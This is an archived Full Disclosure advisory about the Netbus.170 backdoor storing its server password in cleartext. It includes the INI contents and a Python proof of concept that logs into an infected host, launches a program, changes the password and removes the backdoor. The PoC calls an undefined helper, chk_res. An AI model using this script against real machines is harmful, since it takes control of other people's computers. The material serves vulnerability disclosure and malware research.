---
title: Backdoor.Win32.Netbus.170 / Insecure Credential Storage /	MVID-2025-0703
url: https://seclists.org/fulldisclosure/2025/Dec/30
source: Full Disclosure
date: 2025-12-28
fetch_date: 2025-12-29T03:34:39.158410
---

# Backdoor.Win32.Netbus.170 / Insecure Credential Storage /	MVID-2025-0703

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](29)
[By Date](date.html#30)
[![Next](/images/right-icon-16x16.png)](31)

[![Previous](/images/left-icon-16x16.png)](29)
[By Thread](index.html#30)
[![Next](/images/right-icon-16x16.png)](31)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Netbus.170 / Insecure Credential Storage / MVID-2025-0703

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Tue, 23 Dec 2025 00:50:13 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2025
Original source:
https://malvuln.com/advisory/086f0693f81f6d40460c215717349a1f.txt
Malvuln Intelligence Feed: https://intel.malvuln.com/
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Netbus.170
Vulnerability: Insecure Credential Storage
Family: Netbus
Type: PE32
Attack-pattern TTP: Unsecured Credentials (T1552)
MD5: 086f0693f81f6d40460c215717349a1f
SHA256: bba330e82434d3bcf41e18d7d15df8117883e761aa50858028833a7da84b271c
Vuln ID: MVID-2025-0703
Dropped files: C:\Windows\KeyHook.dll
Disclosure: 12/23/2025
Description: The malware listens on TCP ports 12632 and 12631. The
backdoor server password "ecoli" is stored in cleartext in an .INI
textfile, stored under "C:\Windows" having the same name as the
malware. Third party attackers who have knowledge of the password can
login and issue various commands separated  by semicolon. Commands
include program execution, change the backdoor password and malware
removal using command "RemoveServer;1".

[Settings]
Port1=12631
ServerPwd=ecoli
LogTraffic=0
MailTo=
MailFrom=
MailHost=

Exploit/PoC:
from socket import *

MALWARE_HOST="x.x.x.x"
PORT=12631

def main():

    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    PAYLOAD="Password;0;ecoli\r\n"
    s.send(PAYLOAD.encode())

    #Run a program or app:
    s.send("StartApp;calc\r\n".encode())

    #Change backdoor password
    s.send("ServerPwd;malvuln;\r\n".encode())
    print(chk_res(s))

    #Remove backdoor use command ; 1
    s.send("RemoveServer;1\r\n".encode())

    s.close()

if __name__ == "__main__":
    main()

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](29)
[By Date](date.html#30)
[![Next](/images/right-icon-16x16.png)](31)

[![Previous](/images/left-icon-16x16.png)](29)
[By Thread](index.html#30)
[![Next](/images/right-icon-16x16.png)](31)

### Current thread:

* **Backdoor.Win32.Netbus.170 / Insecure Credential Storage / MVID-2025-0703** *malvuln (Dec 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")